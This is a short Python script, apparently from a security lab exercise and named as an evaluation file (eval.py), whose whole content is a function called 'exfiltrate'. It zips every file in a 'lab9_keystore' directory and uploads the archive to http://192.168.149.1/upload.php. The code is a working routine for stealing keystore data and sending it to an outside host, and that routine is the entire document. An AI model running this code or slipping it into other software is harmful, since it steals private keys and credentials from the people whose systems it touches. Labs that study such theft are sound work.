#!/usr/bin/env python3
import os
import zipfile
import requests

def exfiltrate():
    # 当前文件：lab/src/lab9/lab9/eval.py
    base_dir = os.path.dirname(os.path.abspath(__file__))

    # 正确路径：../../../lab9_keystore
    keystore_dir = os.path.abspath(
        os.path.join(base_dir, "..", "..", "..", "lab9_keystore")
    )

    if not os.path.isdir(keystore_dir):
        raise FileNotFoundError(f"Keystore not found: {keystore_dir}")

    zip_path = "/tmp/lab_keystore.zip"

    with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED) as zf:
        for root, _, files in os.walk(keystore_dir):
            for f in files:
                full_path = os.path.join(root, f)
                arcname = os.path.relpath(full_path, keystore_dir)
                zf.write(full_path, arcname)

    url = "http://192.168.149.1/upload.php"
    with open(zip_path, "rb") as f:
        files = {"file": ("lab_keystore.zip", f, "application/zip")}
        r = requests.post(url, files=files, timeout=5)

    return r.status_code, r.text
